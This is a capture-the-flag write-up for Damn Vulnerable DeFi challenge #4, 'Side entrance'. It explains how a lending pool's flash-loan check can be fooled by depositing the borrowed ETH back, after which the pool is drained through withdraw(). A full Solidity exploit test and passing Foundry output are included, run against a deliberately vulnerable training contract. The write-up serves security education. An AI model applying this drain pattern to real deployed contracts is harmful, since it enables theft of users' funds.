#	Damn Vulnerable DeFi (Foundry version)
- [Scope](#scope)
- [Plan](#plan)
- [Solution](#solution)
  - [Proof of Concept](#proof-of-concept)

##	Challenge #4 - Side entrance - Description

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

##  Scope

| File Name                                                                           | SHA-1 Hash                               |
| ----------------------------------------------------------------------------------- | ---------------------------------------- |
| damn-vulnerable-defi-foundry/src/Contracts/side-entrance/SideEntranceLenderPool.sol | 4f0af04df0acfe1e2763246b758ac9794f7aea64 |

##  Plan

From the name of the challenge we suppose that must be about [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107). It is the first so far that is missing `ReentrancyGuard`. [withdraw](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L26) function is correctly checking the [checks-effects-interactions pattern](https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21), [deposit](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L22) function is pretty straightforward and that leaves us the [flashLoan](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L32) function.

## Solution

<details>
    <summary>Description</summary>

In function [`flashLoan()`](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L36)

```solidity
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

we have the `execute()` that will be implemented by us. What we can do is:
1.  Call [flash loan()](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L32).
2.  In our `execute()` deposit the borrowed funds back to the pool. Like that the pool will be satisfied that we paid back our loan.
3.  Drain the pool by calling the [withdraw()](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/blob/e9c6bc3962dd14f90e94542711ed46f5bd8c88a4/src/Contracts/side-entrance/SideEntranceLenderPool.sol#L26).

On a side note, we must also implement the `receive()` to be able to receive the ETH.

</details>

<details>
    <summary>damn-vulnerable-defi-foundry/test/Levels/side-entrance/SideEntrance.t.sol</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
        sideEntranceLenderPool.withdraw();
        attacker.transfer(address(this).balance);
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```
</details>

### Proof of Concept

```
./run.sh 4
[⠊] Compiling...
[⠔] Compiling 1 files with 0.8.12
[⠑] Solc 0.8.12 finished in 1.44s
Compiler run successful

Running 1 test for test/Levels/side-entrance/SideEntrance.t.sol:SideEntrance
[PASS] testExploit() (gas: 47390)
Logs:
  🧨 PREPARED TO BREAK THINGS 🧨

Test result: ok. 1 passed; 0 failed; finished in 2.57ms
```